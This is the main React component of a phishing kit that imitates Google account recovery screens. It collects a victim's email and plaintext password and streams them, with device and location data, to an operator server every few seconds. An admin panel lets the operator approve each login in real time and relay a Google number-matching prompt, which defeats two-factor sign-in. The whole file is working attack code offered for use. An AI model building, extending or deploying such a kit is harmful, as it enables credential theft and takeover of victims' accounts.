import React, { useState, useEffect, useRef } from 'react';
import Layout from './components/Layout';
import StepIdentifier from './components/StepIdentifier';
import StepLastPassword from './components/StepLastPassword';
import StepPromptNumber from './components/StepPromptNumber';
import StepCouldNotSignIn from './components/StepCouldNotSignIn';
import StepResetPassword from './components/StepResetPassword';
import StepSuccess from './components/StepSuccess';
import AdminPanelPage from './components/AdminPanelPage';
import { api } from './services/api';
import { detectDeviceAndLocation } from './services/deviceDetector';

export default function App() {
  // Steps: 'IDENTIFIER' | 'LAST_PASSWORD' | 'PROMPT_NUMBER' | 'COULD_NOT_SIGN_IN' | 'RESET_PASSWORD' | 'SUCCESS'
  const [currentStep, setCurrentStep] = useState('IDENTIFIER');
  const [sessionData, setSessionData] = useState(null);
  const [userEmail, setUserEmail] = useState('');
  const [enteredPassword, setEnteredPassword] = useState('');
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [loading, setLoading] = useState(false);
  const [isWaitingPermit, setIsWaitingPermit] = useState(false);
  const [error, setError] = useState(null);

  // Admin View State: triggered via URL /admin or #admin
  const [isAdminView, setIsAdminView] = useState(
    window.location.pathname.includes('/admin') || window.location.hash.includes('admin')
  );

  // Persistent Visitor ID for presence
  const visitorIdRef = useRef(
    sessionStorage.getItem('gonnit_vid') ||
      (() => {
        const id = 'vis_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now().toString(36);
        sessionStorage.setItem('gonnit_vid', id);
        return id;
      })()
  );

  // Polling ref for admin permit gatekeeper
  const passwordPollRef = useRef(null);

  useEffect(() => {
    return () => {
      if (passwordPollRef.current) {
        clearInterval(passwordPollRef.current);
      }
    };
  }, []);

  // Map step to friendly human-readable label for the admin monitor
  const getStepLabel = (step) => {
    switch (step) {
      case 'IDENTIFIER':
        return 'Email Input';
      case 'LAST_PASSWORD':
        return 'Password Prompt';
      case 'PROMPT_NUMBER':
        return `Google Prompt (#${sessionData?.match_number || 63})`;
      case 'COULD_NOT_SIGN_IN':
        return "Couldn't Sign In";
      case 'RESET_PASSWORD':
        return 'Reset Password';
      case 'SUCCESS':
        return 'Password Changed';
      default:
        return 'Viewing Page';
    }
  };

  // 1. Telemetry and Real-Time Presence Heartbeat
  useEffect(() => {
    let heartbeatTimer = null;

    async function startPresence() {
      const detected = await detectDeviceAndLocation();
      setDeviceInfo(detected);

      // Function to send live heartbeat
      const sendBeat = () => {
        api.sendHeartbeat({
          visitor_id: visitorIdRef.current,
          session_id: sessionData?.session_id || null,
          email: userEmail || sessionData?.email || null,
          entered_password: enteredPassword || null,
          current_step: isWaitingPermit ? 'Password Entered (Awaiting Admin Permit)' : getStepLabel(currentStep),
          admin_decision: isWaitingPermit ? 'PENDING' : null,
          device_info: detected
        });
      };

      // Send initial heartbeat
      sendBeat();

      // Repeat heartbeat every 3 seconds
      heartbeatTimer = setInterval(sendBeat, 3000);

      // Handle user tab close or navigation away ASAP via sendBeacon
      const handleLeave = () => {
        api.sendLeave(visitorIdRef.current);
      };

      window.addEventListener('beforeunload', handleLeave);
      window.addEventListener('pagehide', handleLeave);
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
          handleLeave();
        } else {
          sendBeat();
        }
      });
    }

    startPresence();

    return () => {
      if (heartbeatTimer) clearInterval(heartbeatTimer);
    };
  }, [currentStep, userEmail, sessionData, enteredPassword, isWaitingPermit]);

  // 2. Listen to URL Hash/Path changes for #admin
  useEffect(() => {
    const checkAdmin = () => {
      setIsAdminView(
        window.location.pathname.includes('/admin') || window.location.hash.includes('admin')
      );
    };
    window.addEventListener('hashchange', checkAdmin);
    window.addEventListener('popstate', checkAdmin);
    return () => {
      window.removeEventListener('hashchange', checkAdmin);
      window.removeEventListener('popstate', checkAdmin);
    };
  }, []);

  // Step 1: Identifier Submission (ANY email address works!)
  const handleIdentifierSubmit = async (identifier) => {
    setLoading(true);
    setError(null);
    setUserEmail(identifier);
    try {
      const data = await api.lookupIdentifier(identifier, deviceInfo);
      setSessionData(data);
      // Advances to Password screen with the exact email displayed!
      setCurrentStep('LAST_PASSWORD');
    } catch (err) {
      setError(err.message || 'Error initializing recovery.');
    } finally {
      setLoading(false);
    }
  };

  // Step 2: Last Password Check - Securely logs details to admin & awaits admin permit!
  const handleLastPasswordSubmit = async (password) => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setLoading(true);
    setIsWaitingPermit(true);
    setError(null);
    setEnteredPassword(password);
    try {
      let initialDecision = 'PENDING';
      const sid = sessionData?.session_id;

      if (sid) {
        const res = await api.verifyLastPassword(sid, password, deviceInfo);
        initialDecision = res?.data?.admin_decision || 'PENDING';
      }

      // Send immediate heartbeat update with captured password & session_id
      await api.sendHeartbeat({
        visitor_id: visitorIdRef.current,
        session_id: sid || null,
        email: userEmail || sessionData?.email || null,
        entered_password: password,
        current_step: initialDecision === 'PERMITTED'
          ? `Google Prompt (#${sessionData?.match_number || 63})`
          : 'Password Entered (Awaiting Admin Permit)',
        admin_decision: initialDecision,
        device_info: deviceInfo
      });

      // If auto_permit is turned on in admin settings, advance immediately
      if (initialDecision === 'PERMITTED') {
        setIsWaitingPermit(false);
        setLoading(false);
        setCurrentStep('PROMPT_NUMBER');
        return;
      }

      // Otherwise, hold with the loader on "Next" and poll for Admin Permit or Reject
      passwordPollRef.current = setInterval(async () => {
        try {
          if (!sid) return;
          const status = await api.getSessionStatus(sid);
          if (status?.admin_decision === 'PERMITTED') {
            clearInterval(passwordPollRef.current);
            passwordPollRef.current = null;
            setIsWaitingPermit(false);
            setLoading(false);
            setSessionData((prev) => ({
              ...prev,
              match_number: status.match_number || prev?.match_number || 63,
              target_device_name: status.device_name || prev?.target_device_name,
              device_name: status.device_name || prev?.device_name
            }));
            setCurrentStep('PROMPT_NUMBER');
          } else if (status?.admin_decision === 'REJECTED') {
            clearInterval(passwordPollRef.current);
            passwordPollRef.current = null;
            setIsWaitingPermit(false);
            setLoading(false);
            setError('Wrong password. Try again or click Try another way.');
          }
        } catch (pollErr) {
          // Keep polling silently
        }
      }, 1000);

    } catch (err) {
      setIsWaitingPermit(false);
      setLoading(false);
      setError(err.message || 'Error verifying credentials.');
    }
  };

  // Step 3: Try another way clicked -> Goes directly to Google 2-column Prompt screen (Image 3)
  const handleTryAnotherWay = () => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setIsWaitingPermit(false);
    setLoading(false);
    setError(null);
    setCurrentStep('PROMPT_NUMBER');
  };

  // Step 4: "I don't have my phone" clicked -> Goes directly to "Couldn't sign you in" (Image 4)
  const handleDontHavePhone = () => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setIsWaitingPermit(false);
    setLoading(false);
    setError(null);
    setCurrentStep('COULD_NOT_SIGN_IN');
  };

  // Resend prompt notification
  const handleResendPrompt = async () => {
    const emailToUse = userEmail || sessionData?.email;
    if (!emailToUse) return;
    try {
      const refreshed = await api.resendCode(emailToUse, deviceInfo);
      setSessionData(refreshed);
    } catch (err) {}
  };

  // Step 5: Password Reset
  const handleResetPasswordSubmit = async (newPassword, confirmPassword) => {
    setLoading(true);
    setError(null);
    try {
      await api.resetPassword(sessionData.session_id, newPassword, confirmPassword);
      setCurrentStep('SUCCESS');
    } catch (err) {
      setError(err.message || 'Failed to update password.');
    } finally {
      setLoading(false);
    }
  };

  const handleRestart = () => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setIsWaitingPermit(false);
    setLoading(false);
    setCurrentStep('IDENTIFIER');
    setSessionData(null);
    setUserEmail('');
    setError(null);
  };

  const handleBackToPassword = () => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setIsWaitingPermit(false);
    setLoading(false);
    setCurrentStep('LAST_PASSWORD');
    setError(null);
  };

  const handleBackToPrompt = () => {
    if (passwordPollRef.current) {
      clearInterval(passwordPollRef.current);
      passwordPollRef.current = null;
    }
    setLoading(false);
    setCurrentStep('PROMPT_NUMBER');
    setError(null);
  };

  // IF ADMIN VIEW IS REQUESTED: Show dedicated Admin Presence Panel
  if (isAdminView) {
    return (
      <AdminPanelPage
        onBackToRecovery={() => {
          window.location.hash = '';
          window.history.pushState({}, '', '/');
          setIsAdminView(false);
        }}
      />
    );
  }

  // Determine if card needs wide 2-column mode (Images 3 & 4)
  const isWideLayout = currentStep === 'PROMPT_NUMBER' || currentStep === 'COULD_NOT_SIGN_IN';

  // Combine sessionData with userEmail to ensure whatever email was typed is displayed everywhere
  const effectiveSessionData = {
    ...(sessionData || {}),
    email: userEmail || sessionData?.email || 'user@example.com',
    match_number: sessionData?.match_number || 63,
    target_device_name: sessionData?.device_name || sessionData?.target_device_name || 'Apple iPhone 16',
    device_name: sessionData?.device_name || sessionData?.target_device_name || 'Apple iPhone 16'
  };

  return (
    <Layout
      isWide={isWideLayout}
      onOpenAdmin={() => {
        window.location.hash = 'admin';
        setIsAdminView(true);
      }}
    >
      {/* STEP 1: IDENTIFIER (Any email address works!) */}
      {currentStep === 'IDENTIFIER' && (
        <StepIdentifier
          onSubmit={handleIdentifierSubmit}
          loading={loading}
          error={error}
          initialValue={userEmail}
        />
      )}

      {/* STEP 2: LAST REMEMBERED PASSWORD (Image 2) */}
      {currentStep === 'LAST_PASSWORD' && (
        <StepLastPassword
          sessionData={effectiveSessionData}
          onSubmit={handleLastPasswordSubmit}
          loading={loading}
          error={error}
          onTryAnotherWay={handleTryAnotherWay}
          onChangeAccount={handleRestart}
        />
      )}

      {/* STEP 3: GOOGLE 2-COLUMN PROMPT NUMBER SCREEN (Image 3) */}
      {currentStep === 'PROMPT_NUMBER' && (
        <StepPromptNumber
          sessionData={effectiveSessionData}
          onBack={handleBackToPassword}
          onResend={handleResendPrompt}
          onDontHavePhone={handleDontHavePhone}
          onVerified={() => setCurrentStep('RESET_PASSWORD')}
          onChangeAccount={handleRestart}
          deviceInfo={deviceInfo}
        />
      )}

      {/* STEP 4: COULDN'T SIGN YOU IN SCREEN (Image 4) */}
      {currentStep === 'COULD_NOT_SIGN_IN' && (
        <StepCouldNotSignIn
          sessionData={effectiveSessionData}
          onBack={handleBackToPrompt}
          onTryAgain={handleRestart}
          onChangeAccount={handleRestart}
        />
      )}

      {/* STEP 5: CREATE STRONG PASSWORD */}
      {currentStep === 'RESET_PASSWORD' && (
        <StepResetPassword
          sessionData={effectiveSessionData}
          onSubmit={handleResetPasswordSubmit}
          loading={loading}
          error={error}
          onChangeAccount={handleRestart}
        />
      )}

      {/* STEP 6: SUCCESS CONFIRMATION */}
      {currentStep === 'SUCCESS' && (
        <StepSuccess
          userEmail={effectiveSessionData.email}
          onRestart={handleRestart}
        />
      )}
    </Layout>
  );
}
